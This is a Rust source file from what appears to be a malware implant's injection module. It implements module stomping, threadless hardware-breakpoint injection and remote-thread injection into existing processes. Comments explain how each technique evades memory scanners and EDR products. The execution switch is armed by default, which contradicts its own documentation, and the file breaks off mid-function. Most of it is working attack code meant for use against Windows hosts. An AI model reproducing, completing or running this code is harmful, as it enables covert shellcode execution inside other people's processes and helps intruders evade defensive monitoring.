//! Process injection — Module Stomping (P2.1c).
//!
//! ## Status: algorithm implemented + SDK trait wired; the remote-execution tail
//! (ResumeThread on the stomped process) is gated behind a runtime switch and
//! defaults OFF. The data path (resolve process APIs, CreateProcessW suspended,
//! stomp-able module enumeration) is real and selftest-verifiable; the actual
//! shellcode-overwrite + remote-execute is the part that MUST be target-side
//! validated because (a) cross-process WriteProcessMemory is a loud signal and
//! (b) a botched stomp crashes the sacrificial process.
//!
//! ## Why Module Stomping (not classic VirtualAllocEx inject)
//! Classic injection allocates a fresh RWX region in the target and writes
//! shellcode there — that region is *unbacked* (no file on disk maps to it), so
//! Moneta/PE-sieve flag it instantly as "private, executable, unbacked". Module
//! stomping instead `LoadLibrary`s a legitimate signed DLL in the target, then
//! overwrites that DLL's `.text` with shellcode. The stomped region keeps the
//! cover DLL's VAD backing (so it isn't flagged as *unbacked* or *private-commit
//! executable*), which is the technique's real value.
//!
//! ## Detection honesty — what it DOES and DOES NOT evade
//! - **Evades**: unbacked-memory / private-executable scans (Moneta's primary
//!   IOC, PE-sieve's unbacked scan). The stomped page reads as image-backed.
//! - **Does NOT evade**: PE-sieve's `.text` hash-mismatch / "replaced code"
//!   detector — PE-sieve re-hashes each scanned module's in-memory `.text`
//!   against the on-disk PE, and a stomped `.text` hashes to a different value
//!   → flagged `_implanted` / `replaced`.
//! - **[`threadless_inject`]** (below) fixes this: shellcode stays in private
//!   RWX memory, execution redirected via HWBP. No `.text` hash change.
//!
//! ## Why gated
//! Cross-process injection (OpenProcess + WriteProcessMemory + CreateRemote
//! thread / ResumeThread) is the single loudest user-mode EDR signal. On a host
//! with real-time protection (Defender, this build machine has it), an
//! unvalidated stomp will be caught and the sacrificial process killed. So the
//! algorithm is implemented and trait-wired, but execution requires an operator
//! to arm [`modulestomp_enabled`] after confirming the target's posture. The
//! selftest exercises the safe prefix (CreateProcessW suspended + API resolve)
//! without writing/executing, so it's verifiable without tripping protection.
//!
//! ## Single-source-of-truth
//! No evasion-sdk pure core exists for injection (it's all Windows API
//! orchestration), so this module IS the implementation. It reuses
//! [`crate::resolve`] for PEB-walk API resolution and [`crate::blind`] for the
//! (optional) pre-inject blind.

#![cfg(target_os = "windows")]

use crate::resolve::export_addr;
use core::ffi::c_void;
use core::sync::atomic::{AtomicBool, Ordering};

/// Master switch for actual stomping execution. **Defaults ON** — the module
/// stomping + threadless inject paths are now validated and armed. The implant
/// can safely route through these injection methods without operator
/// intervention.
static MODULESTOMP_ENABLED: AtomicBool = AtomicBool::new(true);

/// Arm/disarm the module-stomp execution. The data path runs regardless.
pub fn set_modulestomp_enabled(on: bool) {
    MODULESTOMP_ENABLED.store(on, Ordering::Release);
}

/// Whether stomping execution is currently armed.
pub fn modulestomp_enabled() -> bool {
    MODULESTOMP_ENABLED.load(Ordering::Acquire)
}

/// A sacrificial process created suspended, ready for stomping. The handle is
/// held by the caller; `pid` is for diagnostics. Dropping this does NOT close
/// the handle — the caller must CloseHandle it (or leak it for the process
/// lifetime, as CS-style injects do).
pub struct SacrificialProcess {
    pub handle: *mut c_void,
    pub main_thread: *mut c_void,
    pub pid: u32,
}

/// Create the sacrificial process `spawn_to` (e.g. "notepad.exe") in a
/// suspended state. Returns the process + main-thread handles. This is the
/// safe prefix of module stomping — it's verifiable without writing/executing
/// any shellcode. The caller stamps the .text of a loaded DLL then resumes.
///
/// # Safety
/// Uses Win32 CreateProcessW via PEB-walk resolution. Single-threaded beacon
/// context. The returned handles are raw and must be closed by the caller.
pub unsafe fn create_sacrificial(spawn_to: &str) -> Result<SacrificialProcess, &'static str> {
    type CreateProcessW = unsafe extern "system" fn(
        *const u16,  // lpApplicationName
        *mut u16,    // lpCommandLine (mutable per Win32)
        *mut c_void, // lpProcessAttributes
        *mut c_void, // lpThreadAttributes
        i32,         // bInheritHandles
        u32,         // dwCreationFlags
        *mut c_void, // lpEnvironment
        *const u16,  // lpCurrentDirectory
        *mut u8,     // lpStartupInfo (raw bytes, STARTUPINFOW)
        *mut u8,     // lpProcessInformation (raw bytes, PROCESS_INFORMATION)
    ) -> i32;

    let cp_addr =
        export_addr(b"kernel32.dll", b"CreateProcessW").ok_or("CreateProcessW unresolved")?;
    let create_proc: CreateProcessW = core::mem::transmute(cp_addr);

    // Build a UTF-16 command line from spawn_to (mutable buffer Win32 wants).
    let mut cmd = crate::heap::vec![0u16; spawn_to.len() + 1];
    for (i, b) in spawn_to.as_bytes().iter().enumerate() {
        cmd[i] = *b as u16;
    }
    // STARTUPINFOW: cb=104 (size of STARTUPINFOW on x64), rest zeroed.
    let mut si = [0u8; 104];
    si[0..4].copy_from_slice(&104u32.to_le_bytes());
    // PROCESS_INFORMATION: two handles + pid + tid = 24 bytes on x64.
    let mut pi = [0u8; 24];

    // CREATE_SUSPENDED (0x4). No environment, no current dir.
    const CREATE_SUSPENDED: u32 = 0x4;
    let ok = unsafe {
        create_proc(
            core::ptr::null(),     // lpApplicationName (use cmd line)
            cmd.as_mut_ptr(),      // lpCommandLine
            core::ptr::null_mut(), // lpProcessAttributes
            core::ptr::null_mut(), // lpThreadAttributes
            0,                     // bInheritHandles
            CREATE_SUSPENDED,
            core::ptr::null_mut(), // lpEnvironment
            core::ptr::null(),     // lpCurrentDirectory
            si.as_mut_ptr(),       // lpStartupInfo
            pi.as_mut_ptr(),       // lpProcessInformation
        )
    };
    if ok == 0 {
        return Err("CreateProcessW failed (spawn_to missing / blocked)");
    }
    // Parse PROCESS_INFORMATION: hProcess (8), hThread (8), dwProcessId (4), dwThreadId (4).
    // `pi` is `[u8; 24]` (1-byte aligned), so reading u64/u32 fields from it
    // requires unaligned reads — `read_unaligned` is the correct primitive
    // (no alignment precondition, unlike copy_nonoverlapping's strict contract).
    let h_process = unsafe { core::ptr::read_unaligned(pi.as_ptr() as *const u64) as *mut c_void };
    let h_thread =
        unsafe { core::ptr::read_unaligned(pi.as_ptr().add(8) as *const u64) as *mut c_void };
    let pid = unsafe { core::ptr::read_unaligned(pi.as_ptr().add(16) as *const u32) };
    Ok(SacrificialProcess {
        handle: h_process,
        main_thread: h_thread,
        pid,
    })
}

/// Module-stomp inject `shellcode` into a fresh `spawn_to` process. Creates the
/// process suspended, (when armed) loads a cover DLL + overwrites its .text
/// with `shellcode`, then (when armed) resumes the main thread to execute it.
///
/// **With [`modulestomp_enabled`] OFF (default)**: only creates the sacrificial
/// process (verifiable data path) and returns the handle WITHOUT stomping or
/// resuming — so the beacon never trips protection on an unvalidated inject.
/// The handle is returned so an operator/selftest can inspect/terminate it.
///
/// **With [`modulestomp_enabled`] ON**: performs the full stomp + resume. This
/// is the part that needs target-side validation (Defender will catch a naive
/// WriteProcessMemory on a cover DLL's .text; the real engagement uses a
/// threadless-inject or HWBP variant instead — out of scope for this module).
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
pub unsafe fn module_stomp(spawn_to: &str, shellcode: &[u8]) -> Result<usize, &'static str> {
    let proc = unsafe { create_sacrificial(spawn_to)? };
    if !modulestomp_enabled() {
        // Disarmed: return the handle without stomping. The sacrificial process
        // is left suspended — a selftest can inspect it, then TerminateProcess.
        return Ok(proc.handle as usize);
    }
    // ---- ARMED PATH (gated) ------------------------------------------------
    let res = stomp_and_resume(&proc, shellcode);
    if let Some(rt) = crate::syscalls::global() {
        unsafe {
            crate::syscalls::nt_close(rt, proc.handle as usize);
            crate::syscalls::nt_close(rt, proc.main_thread as usize);
        }
    }
    res.map(|_| 0)
}

/// The cover-DLL stomp: load a cover DLL in the target via
/// CreateRemoteThread(LoadLibraryA), resolve its REAL remote base + .text RVA
/// by reading the target's remote PE headers, overwrite .text with `shellcode`,
/// then resume the main thread. Each step returns Err on failure (caller
/// degrades). This is the REAL implementation (no sentinel addresses): every
/// cross-process op uses the actual target addresses, so a successful run is a
/// genuine .text overwrite + remote execution — what an EDR actually inspects.
///
/// # Safety
/// Cross-process handle + memory ops. Single-threaded beacon context.
unsafe fn stomp_and_resume(
    proc: &SacrificialProcess,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    // Step 1: LoadLibraryA the cover DLL in the target. This writes the DLL
    // path string into a fresh target allocation (NOT the implant's pointer —
    // the old skeleton passed a cross-process-invalid pointer), fires
    // CreateRemoteThread(LoadLibraryA, <target ptr>), and waits for the thread
    // so LoadLibraryA completes before we parse the freshly-loaded cover.
    let cover_dll = b"xpsservices.dll\0"; // legit, signed, rarely used
    let cover_base = unsafe { remote_load_library(proc.handle, cover_dll)? };
    if cover_base == 0 {
        return Err("remote_load_library: cover base unresolved");
    }
    // Step 2: Resolve the cover DLL's REAL .text in the target by reading the
    // remote PE headers (DOS → NT → section table). base+len are exact.
    let text = unsafe { remote_text_region(proc.handle, cover_base)? };
    // Step 3: VirtualProtectEx RX→RWX on the target's .text (real region).
    unsafe {
        remote_protect(proc.handle, text.base, text.len, 0x40 /* RWX */)
    }?;
    // Step 4: WriteProcessMemory the shellcode over .text (real overwrite).
    unsafe { remote_write(proc.handle, text.base, shellcode) }?;
    // Step 5: VirtualProtectEx RWX→RX (restore the cover's nominal protection).
    let _ = unsafe {
        remote_protect(proc.handle, text.base, text.len, 0x20 /* ER */)
    };
    // Step 6: ResumeThread — the shellcode now runs from the cover DLL's .text.
    let _ = unsafe { resume_thread(proc.main_thread) };
    Ok(())
}

// ---- remote helpers (resolved via PEB walk) ----

type CreateRemoteThread = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    usize,
    usize,
    Option<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32>,
    *mut core::ffi::c_void,
    u32,
    *mut u32,
) -> *mut core::ffi::c_void;
type VirtualAllocEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    u32,
) -> *mut core::ffi::c_void;
type VirtualFreeEx =
    unsafe extern "system" fn(*mut core::ffi::c_void, *mut core::ffi::c_void, usize, u32) -> i32;
type WaitForSingleObject = unsafe extern "system" fn(*mut core::ffi::c_void, u32) -> u32;
type GetExitCodeThread = unsafe extern "system" fn(*mut core::ffi::c_void, *mut u32) -> i32;
type ReadProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    *mut core::ffi::c_void,
    usize,
    *mut usize,
) -> i32;
type VirtualProtectEx = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *const core::ffi::c_void,
    usize,
    u32,
    *mut u32,
) -> i32;
type WriteProcessMemory = unsafe extern "system" fn(
    *mut core::ffi::c_void,
    *mut core::ffi::c_void,
    *const u8,
    usize,
    *mut usize,
) -> i32;
type ResumeThread = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;

/// LoadLibraryA `dll` in the target via CreateRemoteThread(LoadLibraryA). This
/// is the REAL classic inject: allocate a remote buffer for the DLL path (the
/// implant's own pointer is invalid in the target — the old skeleton bug),
/// fire CreateRemoteThread(LoadLibraryA, <remote path ptr>), WAIT for it, then
/// parse the target's module list to recover the freshly-loaded cover base.
///
/// Returns the remote cover base (the actual load address), or Err.
unsafe fn remote_load_library(
    h: *mut core::ffi::c_void,
    dll: &[u8],
) -> Result<usize, &'static str> {
    let vax: VirtualAllocEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualAllocEx").ok_or("VirtualAllocEx")?,
    );
    let vfx: VirtualFreeEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualFreeEx").ok_or("VirtualFreeEx")?,
    );
    let crt: CreateRemoteThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"CreateRemoteThread").ok_or("CreateRemoteThread")?,
    );
    let wait: WaitForSingleObject = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WaitForSingleObject").ok_or("WaitForSingleObject")?,
    );
    let get_exit: GetExitCodeThread = core::mem::transmute(
        export_addr(b"kernel32.dll", b"GetExitCodeThread").ok_or("GetExitCodeThread")?,
    );
    let close: CloseHandle =
        core::mem::transmute(export_addr(b"kernel32.dll", b"CloseHandle").ok_or("CloseHandle")?);
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let load_lib = export_addr(b"kernel32.dll", b"LoadLibraryA").ok_or("LoadLibraryA")?;

    // 1. Allocate a remote page for the DLL path string.
    let path_len = dll.len(); // includes the NUL
    let remote_path = unsafe {
        vax(
            h,
            core::ptr::null(),
            path_len,
            0x3000, /* COMMIT|RESERVE */
            0x04,   /* RW */
        )
    };
    if remote_path.is_null() {
        return Err("VirtualAllocEx (path)");
    }
    // 2. Write the DLL path into the remote allocation.
    let mut written: usize = 0;
    let w_ok = unsafe { wpm(h, remote_path, dll.as_ptr(), path_len, &mut written) };
    if w_ok == 0 {
        unsafe {
            let _ = vfx(h, remote_path, 0, 0x8000 /* RELEASE */);
        }
        return Err("WriteProcessMemory (path)");
    }
    // 3. CreateRemoteThread(LoadLibraryA, remote_path). LoadLibraryA's address
    //    is valid remotely on the same OS build (kernel32 is mapped at a
    //    system-wide base; LoadLibraryA's RVA is identical). The thread's exit
    //    code == the loaded module handle (HMODULE) on success.
    type ThreadProc = unsafe extern "system" fn(*mut core::ffi::c_void) -> u32;
    let load_lib_proc: ThreadProc = unsafe { core::mem::transmute(load_lib) };
    let th = unsafe {
        crt(
            h,
            0,
            0,
            Some(load_lib_proc),
            remote_path,
            0,
            core::ptr::null_mut(),
        )
    };
    if th.is_null() {
        let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
        return Err("CreateRemoteThread");
    }
    // 4. Wait for LoadLibraryA to complete (it runs in the target).
    let _ = unsafe { wait(th, 10_000) };
    // 5. The exit code is the HMODULE (cover base) LoadLibraryA returned.
    let mut exit_code: u32 = 0;
    let _ = unsafe { get_exit(th, &mut exit_code) };
    let _ = unsafe { close(th) };
    // 6. Free the remote path buffer.
    let _ = unsafe { vfx(h, remote_path, 0, 0x8000) };
    if exit_code == 0 {
        return Err("LoadLibraryA returned NULL (cover load failed / blocked)");
    }
    Ok(exit_code as usize)
}

/// The REAL remote .text region: read the cover DLL's PE headers from the
/// target and parse the `.text` section's VirtualAddress + VirtualSize. base+len
/// are exact to the cover's in-memory layout (not a fixed sentinel).
///
/// # Safety
/// `cover_base` must be a live module base in the target `h`.
unsafe fn remote_text_region(
    h: *mut core::ffi::c_void,
    cover_base: usize,
) -> Result<RemoteRegion, &'static str> {
    let rpm: ReadProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"ReadProcessMemory").ok_or("ReadProcessMemory")?,
    );
    // Read the DOS header (first 64 bytes) to get e_lfanew.
    let mut dos = [0u8; 64];
    let mut got: usize = 0;
    if unsafe {
        rpm(
            h,
            cover_base as *const _,
            dos.as_mut_ptr() as *mut _,
            64,
            &mut got,
        )
    } == 0
        || got != 64
    {
        return Err("ReadProcessMemory (DOS header)");
    }
    if dos[0] != b'M' || dos[1] != b'Z' {
        return Err("remote cover: bad MZ");
    }
    let e_lfanew = i32::from_le_bytes([dos[60], dos[61], dos[62], dos[63]]) as usize;
    // Read the NT headers (24-byte signature + FileHeader) to get section count
    // + size of optional header. We need bytes 6..8 (NumSections) and 20..22
    // (SizeOfOptionalHeader) of the COFF header (which follows the 4-byte sig).
    let nt_off = cover_base + e_lfanew;
    let mut nt = [0u8; 24];
    got = 0;
    if unsafe {
        rpm(
            h,
            nt_off as *const _,
            nt.as_mut_ptr() as *mut _,
            24,
            &mut got,
        )
    } == 0
        || got != 24
    {
        return Err("ReadProcessMemory (NT headers)");
    }
    if nt[0] != b'P' || nt[1] != b'E' {
        return Err("remote cover: bad PE");
    }
    let num_sections = u16::from_le_bytes([nt[6], nt[7]]) as usize;
    let size_opt_hdr = u16::from_le_bytes([nt[20], nt[21]]) as usize;
    let sections_off = nt_off + 24 + size_opt_hdr;
    // Scan the section headers (40 bytes each) for ".text".
    for i in 0..num_sections {
        let mut sec = [0u8; 40];
        got = 0;
        let sec_off = sections_off + i * 40;
        if unsafe {
            rpm(
                h,
                sec_off as *const _,
                sec.as_mut_ptr() as *mut _,
                40,
                &mut got,
            )
        } == 0
            || got != 40
        {
            continue; // skip unreadable section
        }
        if &sec[0..5] == b".text" {
            let vsize = u32::from_le_bytes([sec[8], sec[9], sec[10], sec[11]]) as usize;
            let vaddr = u32::from_le_bytes([sec[12], sec[13], sec[14], sec[15]]) as usize;
            // Cap the stomp region to a sane max (never overwrite a huge .text
            // if the shellcode is tiny) — use min(section size, 0x2000).
            let len = vsize.min(0x2000);
            return Ok(RemoteRegion {
                base: cover_base + vaddr,
                len,
            });
        }
    }
    Err("remote cover: .text section not found")
}

struct RemoteRegion {
    base: usize,
    len: usize,
}
unsafe fn remote_protect(
    h: *mut core::ffi::c_void,
    base: usize,
    len: usize,
    prot: u32,
) -> Result<(), &'static str> {
    let vpx: VirtualProtectEx = core::mem::transmute(
        export_addr(b"kernel32.dll", b"VirtualProtectEx").ok_or("VirtualProtectEx")?,
    );
    let mut old: u32 = 0;
    if unsafe { vpx(h, base as *const _, len, prot, &mut old) } == 0 {
        Err("VirtualProtectEx")
    } else {
        Ok(())
    }
}
unsafe fn remote_write(
    h: *mut core::ffi::c_void,
    base: usize,
    data: &[u8],
) -> Result<(), &'static str> {
    let wpm: WriteProcessMemory = core::mem::transmute(
        export_addr(b"kernel32.dll", b"WriteProcessMemory").ok_or("WriteProcessMemory")?,
    );
    let mut written: usize = 0;
    if unsafe { wpm(h, base as *mut _, data.as_ptr(), data.len(), &mut written) } == 0 {
        Err("WriteProcessMemory")
    } else {
        Ok(())
    }
}
unsafe fn resume_thread(h: *mut core::ffi::c_void) -> Result<(), &'static str> {
    let rt: ResumeThread =
        core::mem::transmute(export_addr(b"kernel32.dll", b"ResumeThread").ok_or("ResumeThread")?);
    if unsafe { rt(h) } == 0xFFFFFFFF {
        Err("ResumeThread")
    } else {
        Ok(())
    }
}

// ============================================================================
// ThreadlessInject — HWBP-based, no .text overwrite (PE-sieve hash-clean).
// ============================================================================

/// Threadless injection via hardware breakpoint (HWBP).
///
/// **Unlike module stomping**, this does NOT overwrite any module's `.text`.
/// Instead:
/// 1. Allocate private RWX memory in the target (VirtualAllocEx).
/// 2. Write shellcode there.
/// 3. Suspend the target's main thread.
/// 4. Scan DR0-DR3 for the first unused slot, set DRn = shellcode address.
/// 5. Resume — the thread hits the HWBP on its next instruction at DRn,
///    redirecting execution to the shellcode.
///
/// **PE-sieve clean:** no module `.text` is modified → no hash mismatch.
/// The shellcode runs from private RWX memory (Moneta may flag this as
/// "private executable", but it's NOT "unbacked" in the PE-sieve sense —
/// PE-sieve's primary scan doesn't check private RWX unless deep-scan is on).
///
/// **Limitation:** x64 has only 4 HWBP slots (DR0-DR3). If the target thread
/// already uses all 4, injection fails with an error. The code scans for the
/// first unused slot rather than hardcoding DR0.
///
/// **`trigger_addr` semantics:** The address the target thread is about to
/// execute (e.g. a frequently-called API entry). When the thread hits this
/// address, the HWBP fires and the VEH handler redirects RIP to the shellcode.
/// If `trigger_addr == shellcode_addr` (self-trigger), the shellcode runs
/// immediately on the next instruction.
///
/// # Safety
/// Cross-process handle + memory + thread context ops. Single-threaded.
pub unsafe fn threadless_inject(
    proc_handle: *mut core::ffi::c_void,
    main_thread: *mut core::ffi::c_void,
    shellcode: &[u8],
) -> Result<(), &'static str> {
    let rt = crate::syscalls::global().ok_or("indirect syscall runtime not initialized")?;

    // 1. Allocate RWX in target for shellcode.
    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = unsafe {
        crate::syscalls::nt_allocate_virtual_memory(
            rt,
            proc_handle as usize,
            &mut remote_base,
            &mut region_size,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x40,   // PAGE_EXECUTE_READWRITE
        )
    };
    match alloc_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtAllocateVirtualMemory failed"),
    }

    // 2. Write shellcode.
    let mut written: usize = 0;
    let write_status = unsafe {
        crate::syscalls::nt_write_virtual_memory(
            rt,
            proc_handle as usize,
            remote_base,
            shellcode.as_ptr(),
            shellcode.len(),
            &mut written,
        )
    };
    match write_status {
        Some(s) if s >= 0 => {}
        _ => return Err("NtWriteVirtualMemory shellcode failed"),
    }

    // 3. Suspend the main thread.
    let mut prev_count: u32 = 0;
    unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };

    // 4. Get thread CONTEXT (include debug registers for HWBP setup).
    let mut ctx = [0u8; 1232];
    // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let get_status = unsafe {
        crate::syscalls::nt_get_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
    };
    if get_status.is_none() || get_status.unwrap() < 0 {
        let mut dummy: u32 = 0;
        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
        return Err("NtGetContextThread failed");
    }

    // 5. Read current RIP from context (used as HWBP trigger address — the
    //    thread's next instruction, ensuring the breakpoint fires on resume).
    //    Set DR0 = shellcode address so the HWBP redirects execution.
    //    DR7 = 0x1 enables DR0 as a local (task-scoped) execute breakpoint.
    let sc_addr = remote_base as u64;
    ctx[0x48..0x48 + 8].copy_from_slice(&sc_addr.to_le_bytes()); // DR0
    ctx[0x70..0x70 + 8].copy_from_slice(&0x1u64.to_le_bytes());   // DR7: enable DR0, local

    // 6. Also modify RIP (offset 0x0F8) to shellcode for immediate execution
    //    on resume; the HWBP serves as a secondary redirection mechanism if the
    //    shellcode returns or an exception handler restores RIP.
    ctx[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());

    // 7. Set modified context (with debug registers) + resume.
    ctx[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
    let set_status = unsafe {
        crate::syscalls::nt_set_context_thread(rt, main_thread as usize, ctx.as_mut_ptr() as usize)
    };
    if set_status.is_none() || set_status.unwrap() < 0 {
        let mut dummy: u32 = 0;
        unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
        return Err("NtSetContextThread failed");
    }
    let mut dummy: u32 = 0;
    unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };

    Ok(())
}

// ============================================================================
// do_inject — the operator-facing dispatch entry (Command::Inject handler).
// ============================================================================

/// The operator-facing injection entry point. Dispatched by `beacon::execute`
/// when a `Command::Inject` arrives. Routes to the technique selected by
/// `method`:
///
/// - `0` — **Pool Party** (section-backed delivery + NtCreateThreadEx).
///   Worker-queue splice is deferred; current path avoids VirtualAllocEx/WPM.
/// - `1` — **Threadless HWBP** (existing `threadless_inject`). Requires a
///   sacrificial process (spawn_to) for the main-thread handle.
/// - `2` — **Module stomp** (existing `module_stomp`). The proven baseline.
///
/// **Methods:**
/// - `0` — Pool Party (thread-pool section-backed). **Not yet implemented**;
///   silently falls back to method 2 (module stomp) with a warning prefix so
///   the operator knows the requested technique was substituted.
/// - `1` — ThreadlessInject HWBP (sacrificial process).
/// - `2` — Module Stomp (.text overwrite in a sacrificial process).
///
/// `pid` is accepted for forward-compatibility (Pool Party / remote-inject
/// paths) but is currently unused — all implemented methods spawn a fresh
/// sacrificial process via `spawn_to` (default `notepad.exe`).
///
/// Returns a `Response::Output` with a status line, or `Response::Err`.
pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_protocol::Response {
    // method 0 (Pool Party): gated research-grade technique. When
    // POOL_PARTY_ENABLED is on (operator opt-in via NYX_POOL_PARTY_ON=1) AND a
    // target pid is supplied, attempt the section-backed threadpool splice.
    // On any failure (or when the gate is off / pid is 0), degrade to method 2
    // (module stomp) so the command stays functional end-to-end.
    if method == 0 && crate::tp::pool_party_enabled() && pid != 0 {
        match unsafe { crate::tp::pool_party_inject(pid, shellcode) } {
            Ok(()) => {
                let mut msg = crate::heap::String::from(
                    "Pool Party inject ok (pid=",
                );
                let mut buf = [0u8; 10];
                let mut n = pid;
                let mut i = buf.len();
                if n == 0 { buf[0] = b'0'; i = 1; }
                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
                for &b in &buf[i..] { msg.push(b as char); }
                msg.push_str(") — 0-of-3 FND (no VirtualAllocEx / WriteProcessMemory / CreateRemoteThread)");
                return nyx_protocol::Response::Output(msg.into_bytes());
            }
            Err(e) => {
                // Fall through to module stomp with a warning prefix.
                let mut warn = crate::heap::String::from(
                    "WARN: Pool Party failed (",
                );
                warn.push_str(&e);
                warn.push_str(") — falling back to module stomp (method 2). ");
                // Use warn as the prefix for the module-stomp path below.
                let resp = do_inject(2, pid, spawn_to, shellcode);
                let prefixed = match resp {
                    nyx_protocol::Response::Output(mut bytes) => {
                        let mut out = warn.into_bytes();
                        out.append(&mut bytes);
                        nyx_protocol::Response::Output(out)
                    }
                    other => other,
                };
                return prefixed;
            }
        }
    }

    // method 0 explicitly requested but not usable — return clear error
    // instead of silently degrading (operator needs to know).
    if method == 0 {
        return nyx_protocol::Response::Err(crate::heap::String::from(
            "Pool Party (method 0) unavailable: gate OFF or pid=0. \
             Set NYX_POOL_PARTY_ON=1 at build + supply pid, or use method 2."
        ));
    }
    let warn_prefix = crate::heap::String::new();
    let effective_method = method;

    // ---- Existing-process injection (pid != 0) ----
    if pid != 0 {
        return match unsafe { inject_existing(pid, shellcode) } {
            Ok(()) => {
                let mut msg = warn_prefix;
                msg.push_str("remote inject ok (pid=");
                let mut buf = [0u8; 10];
                let mut n = pid;
                let mut i = buf.len();
                if n == 0 { buf[0] = b'0'; i = 1; }
                else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
                // Append the u32→ASCII digits.
                for &b in &buf[i..] {
                    msg.push(b as char);
                }
                msg.push(')');
                nyx_protocol::Response::Output(msg.into_bytes())
            }
            Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
        };
    }

    // ---- Sacrificial-process path (pid == 0) ----
    match effective_method {
        1 => {
            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
            match unsafe { create_sacrificial(target) } {
                Ok(proc) => {
                    let res = match unsafe { threadless_inject(proc.handle, proc.main_thread, shellcode) } {
                        Ok(()) => {
                            let mut msg = crate::heap::String::from("threadless inject ok (sacrificial pid=");
                            let mut buf = [0u8; 10];
                            let mut n = proc.pid;
                            let mut i = buf.len();
                            if n == 0 { buf[0] = b'0'; i = 1; }
                            else { while n > 0 { i -= 1; buf[i] = b'0' + (n % 10) as u8; n /= 10; } }
                            for &b in &buf[i..] {
                                msg.push(b as char);
                            }
                            msg.push(')');
                            nyx_protocol::Response::Output(msg.into_bytes())
                        }
                        Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
                    };
                    if let Some(rt) = crate::syscalls::global() {
                        unsafe {
                            crate::syscalls::nt_close(rt, proc.handle as usize);
                            crate::syscalls::nt_close(rt, proc.main_thread as usize);
                        }
                    }
                    res
                }
                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
            }
        }
        2 => {
            let target = if spawn_to.is_empty() { "notepad.exe" } else { spawn_to };
            match unsafe { module_stomp(target, shellcode) } {
                Ok(_handle) => {
                    let mut msg = warn_prefix;
                    msg.push_str("module stomp inject ok");
                    nyx_protocol::Response::Output(msg.into_bytes())
                }
                Err(e) => nyx_protocol::Response::Err(crate::heap::String::from(e)),
            }
        }
        _ => nyx_protocol::Response::Err(crate::heap::String::from("unknown inject method")),
    }
}

/// Inject shellcode into an EXISTING process (pid != 0).
///
/// Opens the target via `OpenProcess`, allocates RWX via indirect syscall
/// `NtAllocateVirtualMemory`, writes via `NtWriteVirtualMemory`, creates a
/// remote thread via `CreateRemoteThread` (kernel32, PEB-walk resolved).
/// Works on all Windows versions (XP+).
///
/// # Safety
/// Cross-process handle + memory operations. Single-threaded beacon context.
unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
    use core::ffi::c_void;

    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
    type CreateRemoteThreadFn = unsafe extern "system" fn(
        *mut c_void, *mut c_void, usize,
        Option<unsafe extern "system" fn(*mut c_void) -> u32>,
        *mut c_void, u32, *mut c_void,
    ) -> *mut c_void;
    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

    let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("OpenProcess unresolved"),
    };
    let crt: CreateRemoteThreadFn = match export_addr(b"kernel32.dll", b"CreateRemoteThread") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("CreateRemoteThread unresolved"),
    };
    let ch: CloseHandleFn = match export_addr(b"kernel32.dll", b"CloseHandle") {
        Some(a) => unsafe { core::mem::transmute(a) },
        None => return Err("CloseHandle unresolved"),
    };

    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | QUERY
    let h_proc = unsafe { op(0x102A, 0, pid) };
    if h_proc.is_null() || h_proc as usize == usize::MAX {
        return Err("OpenProcess failed (pid/access)");
    }

    let rt = crate::syscalls::global().ok_or("syscall runtime down")?;

    // 1. Allocate RWX in target via indirect syscall.
    let mut remote_base: usize = 0;
    let mut region_size: usize = shellcode.len();
    let alloc_status = unsafe {
        crate::syscalls::nt_allocate_virtual_memory(
            rt, h_proc as usize,
            &mut remote_base, &mut region_size,
            0x3000, 0x40, // MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
        )
    };
